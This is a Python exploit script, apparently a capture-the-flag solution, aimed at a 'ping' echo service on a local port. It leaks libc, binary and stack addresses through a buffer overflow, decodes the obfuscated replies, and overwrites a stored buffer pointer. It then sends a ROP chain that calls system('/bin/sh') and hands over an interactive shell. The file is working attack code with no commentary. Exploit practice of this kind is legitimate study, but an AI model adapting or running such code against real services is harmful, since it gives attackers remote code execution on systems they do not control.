#!/usr/bin/python
import socket, struct, telnetlib
import time

from pwn import *


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


def ping(buf):
    read_until(f, 'ping: ')
    f.write(buf + '\n')
    time.sleep(0.1)
    pong = read_until(f, '\n\n')[6:]
    return pong[:-2]


def decode(data):
    decoded = ''
    for i in xrange(len(data)):
        if i % 2 == 0:
            decoded += data[i]
            continue
        t = chr(ord(data[i]) ^ 0x20)
        decoded += chr(ord(data[i]) ^ 0x20)
    return decoded

s, f = sock("127.0.0.1", 4088)

# leak libc
buf = 'A' * 0x48
data = ping(buf)
data = decode(data)
addr_puts = u64(data[-6:].ljust(8, '\x00'))
addr_libc_base = addr_puts - 0x06f690 - 362
addr_system = addr_libc_base + 0x45390
addr_binsh = addr_libc_base + 0x18cd57
print '[+] addr_puts = {}'.format(hex(addr_puts))
print '[+] addr_libc_base = {}'.format(hex(addr_libc_base))
print '[+] addr_system = {}'.format(hex(addr_system))



# leak text address
buf = 'D' * 96
data = ping(buf)
data = decode(data)
addr_text_base = u64(data[-6:].ljust(8, '\x00')) - 0x860
addr_pop_rdi = addr_text_base + 0xcf3
addr_ret = addr_pop_rdi + 1
print '[+] addr_pop_rdi = {}'.format(hex(addr_pop_rdi))


# leak buf to cala ret addr stack addr
buf = 'B' * 0x98
data = ping(buf)
data = decode(data)
addr_buf = u64(data[-6:].ljust(8, '\x00'))
addr_ret_addr = addr_buf - 0x8
#addr_ret_addr = addr_buf + 0xf8
print '[+] addr_buf = {}'.format(hex(addr_buf))
print '[+] addr_ret_addr = {}'.format(hex(addr_ret_addr))


# write the addr_ret_addr to where the address of buffer is stored
buf = 'C' * 0x98 + p64(addr_ret_addr)
ping(buf)
print '[+] buffer address overwritten to {}'.format(hex(addr_ret_addr))

# send ropchain to call system('/bin/sh')
buf = ''
buf += p64(addr_pop_rdi)
buf += p64(addr_binsh)
buf += p64(addr_system)
buf += p64(addr_ret)

read_until(f, 'ping: ')
print '[+] Now send ropchain'
f.write(buf + '\n')
time.sleep(0.1)

f.write(buf + '\n')
shell(s)
